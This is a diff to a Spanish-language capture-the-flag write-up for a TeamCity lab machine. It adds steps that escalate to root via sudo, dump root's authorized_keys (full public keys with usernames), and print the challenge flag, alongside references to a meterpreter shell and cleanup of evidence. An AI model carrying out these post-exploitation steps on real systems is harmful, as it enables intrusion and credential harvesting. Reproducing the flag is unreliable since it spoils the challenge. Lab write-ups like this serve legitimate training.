@@ -222,8 +222,40 @@ FASE 6: LIMPIEZA DE EVIDENCIAS
 [!] Manual cleanup required: /opt/teamcity/TeamCity/webapps/ROOT/plugins/nFkmodSC
 Elimina rastros automáticamente pero requiere borrar manualmente un archivo.
 ```
+## 4.3 Escalar a root
 
-## 4.3 Acceso al sistema y recuperación de la flag
+```bash
+sudo -l
+Matching Defaults entries for ubuntu on ip-10-130-146-34:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ubuntu may run the following commands on ip-10-130-146-34:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+sudo su
+whoami
+root
+```
+## 4.4 Investigación de archivos SSH
+
+```bash
+~/.ssh/
+bash: line 2: /root/.ssh/: Is a directory
+ls -la ~/.ssh/
+total 12
+drwx------ 2 root root 4096 Nov  1  2025 .
+drwx------ 6 root root 4096 Nov  1  2025 ..
+-rw------- 1 root root 2131 Jun 26 09:56 authorized_keys
+cat ~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCFl81YyxRe7IzPaLSYOlUALE52it7X2MGY8OpYaP48HY73Dppw6paBdT5fyLSr30gdCkbWBWJxh9jAaRdCu/Wj/YdF5X6GrkfIka2ATmeF/6bck8twVi2QN5vGjovmdPfT4TquBmUosHa1czu/8gHQeviXb6zPzvG0G5JHSn37WQJbKj6gzm+G9zNuf3VbwrC82siO8w2SMwBknjYQwC0N5YlXEO+qhI36faowKoAZewZzr4JzoDhLBkhWj+EwM31m4l1dBheLP0t/j2GErJAGnu0AAomoxrtENRyc4ujq09sRCOFxfKZfLBXo51OGiw350HSYFYhGCmxYSVt6zldV fredmoore.damian
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCi9vunXvqiRavgiCqZuv2U7UthtSIiZrnqvS0G76wybM17SF6gkPm9uIv53UyulCQNeKbOKJQrLtnNAAP8MbS/E5D2+09ebfbrQBQNeAnUqjLl0drB6ZGaiWXPT4RfLM38G5e1/YVF1YcXUyfTmJXT30YJQiJPrsdBxi3Y2BKgM9ITJxCjbwUa96H6mfSVw3lXH13tY3FGNEfoT0Zf/lKarcF9d6rYxMRAbgqYwY6dH4IyGLGTY8ze6xrqi5s4nBEhQQ7a3Z8qiyMqdp3dmgF2djzzjXdXbCQMu9hlEx4MaXwtDzMzml6DaCdsYN1aLQmg7wBdrDV40MxEETy/NUpt ahmad
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUG9qE7kTCpZUBoEgwBKj/GfO5jXsLHIH/d9Dri+a7hsGpmdivZ6yqG9P2nH/ROKWb6pKqgCkpjGxmIrpM11XOlG89zCwGNE3euVbVc/AI/ZrN6sT4wx2iabrfJW2h006voX+1G7avPQ+I8Z+jv13hHFhrLn10l6m4bkxGzpBq6vmPynh2luXDIyn3wLP0yzSFNwQfG8mHArqLOJJZln4Dy+Z0tQfGOyDSn3Z/GuHvJ9fyvX6OTtm1r2NMYNBvZW5ncEoLUF6yVp5ezUu/WeoddGBFO30hNsLlFMOM6Pfkqvbp8ey3x442CkUuR+JeafShHUmmGcZfdoodWhzjl+99 savagenj
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN
+no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDv+eTaaWXys/ShDXGE/KIelCUYFqP+OQhAwL6LsFml9JR2kA8lWvRM2WQ6QKflnPw47lDggsBcdehASvBj4PaI+boh4slv/RbZCJIMTYKXyh+PysjwefcPs6SQ97NCMbXux/jLMxthXhHwBvMi8/jnKFe4725JZbHHSQW2e32taLkxxVWajjQ6rFXzV31O0PycHu1G6BkBAsqVXvT0D/L6A3D9DA9H3P2gFN+BoLWJ//Fnnu1fVYQnnlzNsHaCRyHXBDhFf1Ih5uVGoHpLU9YyBag0fu+3UQcTFXGoinCPlaiwXgwtXYgZvyi1BjUrMjmkkKLTu2m9F/w0hLrycYTh eu-west-3-vuln-vms
+```
+
+## 4.5 Acceso al sistema y recuperación de la flag
 
 ```bash
 cd /home/ubuntu
@@ -248,7 +280,7 @@ drwx------ 2 ubuntu ubuntu 4096 Jul  2  2024 .ssh
 cat flag.txt
 THM{faa9bac345709b6620a6200b484c7594}
 ```
-## 4.4 Estado del firewall del sistema
+## 4.6 Estado del firewall del sistema
 
 ```bash
 meterpreter > shell
